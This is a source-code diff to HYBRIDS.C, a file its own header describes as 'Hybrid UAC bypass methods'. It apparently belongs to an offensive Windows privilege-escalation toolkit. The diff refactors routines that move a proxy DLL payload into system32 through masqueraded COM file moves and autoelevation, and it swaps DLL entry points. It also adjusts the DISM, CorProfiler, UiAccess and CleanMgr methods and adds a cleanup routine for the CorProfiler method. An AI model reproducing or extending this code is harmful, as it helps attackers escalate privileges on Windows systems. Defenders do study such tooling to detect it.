@@ -4,9 +4,9 @@
 *
 *  TITLE:       HYBRIDS.C
 *
-*  VERSION:     3.70
+*  VERSION:     3.71
 *
-*  DATE:        19 May 2026
+*  DATE:        23 Jul 2026
 *
 *  Hybrid UAC bypass methods.
 *
@@ -17,7 +17,6 @@
 *
 *******************************************************************************/
 #include "global.h"
-#include "makecab.h"
 #include "encresource.h"
 
 /*
@@ -121,7 +120,7 @@ NTSTATUS ucmGenericAutoelevationEx(
         if (lpSubDirectory)
             _strcat(lpDestination, lpSubDirectory);
 
-        //drop payload to system32
+        //move payload from %temp% to system32
         if (ucmMasqueradedMoveFileCOM(lpSource, lpDestination)) {
 
             _strcpy(lpSource, lpDestination);
@@ -430,8 +429,7 @@ NTSTATUS ucmDisemerMethod()
     return STATUS_ACCESS_DENIED;
 }
 
-#define DISM_DLL_NAMES 2
-LPCWSTR g_DismTargets[DISM_DLL_NAMES] = {
+LPCWSTR g_DismTargets[] = {
     DISMCORE_DLL,
     APISET_KERNEL32LEGACY
 };
@@ -447,7 +445,7 @@ LPCWSTR g_DismTargets[DISM_DLL_NAMES] = {
 VOID ucmDismMethodCleanup(VOID)
 {
     DWORD i, cNames;
-    cNames = (g_ctx->dwBuildNumber < NT_WIN10_20H1) ? 1 : DISM_DLL_NAMES;
+    cNames = (g_ctx->dwBuildNumber < NT_WIN10_20H1) ? 1 : RTL_NUMBER_OF(g_DismTargets);
 
     for (i = 0; i < cNames; i++) {
         ucmMethodCleanupSingleItemSystem32(g_DismTargets[i], NULL);
@@ -473,39 +471,47 @@ NTSTATUS ucmDismMethod(
     _In_ DWORD ProxyDllSize
 )
 {
+    BOOL bFileDropped = FALSE;
     NTSTATUS MethodResult = STATUS_ACCESS_DENIED;
     DWORD i, cNames;
     SIZE_T  nLen;
+    PCWSTR lpTempDllName = NULL;
 
     WCHAR   szSource[MAX_PATH * 2];
 
-    cNames = (g_ctx->dwBuildNumber < NT_WIN10_20H1) ? 1 : DISM_DLL_NAMES;
-    
+    cNames = (g_ctx->dwBuildNumber < NT_WIN10_20H1) ? 1 : RTL_NUMBER_OF(g_DismTargets);   
     for (i = 0; i < cNames; i++) {
 
-        MethodResult = ucmGenericAutoelevation(NULL,
-            g_DismTargets[i],
+        //
+        // Move file to system via autoelevation
+        //
+        lpTempDllName = g_DismTargets[i];
+        bFileDropped = NT_SUCCESS(ucmGenericAutoelevation(NULL,
+            lpTempDllName,
             ProxyDll,
-            ProxyDllSize);
+            ProxyDllSize));
 
-        if (NT_SUCCESS(MethodResult)) {
+        if (bFileDropped) {
             MethodResult = ucmDisemerMethod();
+            if (NT_SUCCESS(MethodResult)) {
+                break;
+            }
         }
-
-        //
-        // Cleanup temp.
-        //
-        if (!NT_SUCCESS(MethodResult)) {
+        else {
+            //
+            // Move file failed, cleanup temp.
+            //
             _strcpy(szSource, g_ctx->szTempDirectory);
-            _strcat(szSource, g_DismTargets[i]);
+            _strcat(szSource, lpTempDllName);
             nLen = _strlen(szSource);
             szSource[nLen - 1] = UCM_TRASH_END_CHAR;
             DeleteFile(szSource);
         }
-
-        Sleep(1000);
     }
 
+    if (!NT_SUCCESS(MethodResult)) {
+        supSetGlobalCompletionEvent();
+    }
     return MethodResult;
 }
 
@@ -567,7 +573,7 @@ NTSTATUS ucmUiAccessMethod(
     NTSTATUS MethodResult = STATUS_ACCESS_DENIED;
     SIZE_T Length;
     LPWSTR lpEnv = NULL, lpTargetDll;
-    UNICODE_STRING uStr = RTL_CONSTANT_STRING(L"ProgramFiles=");
+    UNICODE_STRING uStr = RTL_CONSTANT_STRING(T_PF_ENV);
     WCHAR szTarget[MAX_PATH * 2];
     WCHAR szSource[MAX_PATH * 2];
 
@@ -576,10 +582,7 @@ NTSTATUS ucmUiAccessMethod(
         //
         // There is no osksupport.dll in Windows 7.
         //
-        if (g_ctx->dwBuildNumber < NT_WIN8_RTM)
-            lpTargetDll = DUSER_DLL;
-        else
-            lpTargetDll = OSKSUPPORT_DLL;
+        lpTargetDll = (g_ctx->dwBuildNumber < NT_WIN8_RTM) ? DUSER_DLL : OSKSUPPORT_DLL;
 
         //
         // Replace default Fubuki dll entry point with new.
@@ -823,6 +826,26 @@ BOOL ucmSXSDccwMethodCleanup(
 }
 
 /*
+* ucmCorProfilerCleanup
+*
+* Purpose:
+*
+* Post execution cleanup routine for CorProfilerMethod.
+*
+*/
+VOID ucmCorProfilerCleanup(
+    VOID
+)
+{
+    WCHAR szBuffer[MAX_PATH * 2];
+
+    _strcpy(szBuffer, g_ctx->szTempDirectory);
+    _strcat(szBuffer, MYSTERIOUSCUTETHING);
+    _strcat(szBuffer, TEXT(".dll"));
+    DeleteFile(szBuffer);
+}
+
+/*
 * ucmCorProfilerMethod
 *
 * Purpose:
@@ -933,6 +956,9 @@ NTSTATUS ucmCorProfilerMethod(
     if (g_ctx->dwBuildNumber >= NT_WIN8_RTM)
         supSetEnvVariable(TRUE, NULL, COR_PROFILER_PATH, NULL);
 
+    if (!NT_SUCCESS(MethodResult)) {
+        supSetGlobalCompletionEvent();
+    }
     return MethodResult;
 }
 
@@ -1080,7 +1106,7 @@ NTSTATUS ucmJunctionMethod(
     //
     // Drop payload dll to %temp% and make cab for it.
     //
-    cNames = (g_ctx->dwBuildNumber < NT_WIN10_20H1) ? 1 : DISM_DLL_NAMES;
+    cNames = (g_ctx->dwBuildNumber < NT_WIN10_20H1) ? 1 : RTL_NUMBER_OF(g_DismTargets);
 
     for (i = 0; i < cNames; i++) {
 
@@ -1195,7 +1221,6 @@ NTSTATUS ucmMsdtMethod(
         } while (i);
 
     }
-
 
 #ifndef _WIN64
     if (g_ctx->IsWow64) {
@@ -1489,7 +1514,7 @@ NTSTATUS ucmCleanMgrAdminMethod(
         if (!supReplaceDllEntryPoint(
             ProxyDll,
             ProxyDllSize,
-            FUBUKI_DEFAULT_ENTRYPOINT,
+            FUBUKI_EXE_ENTRYPOINT,
             TRUE))
         {
             break;
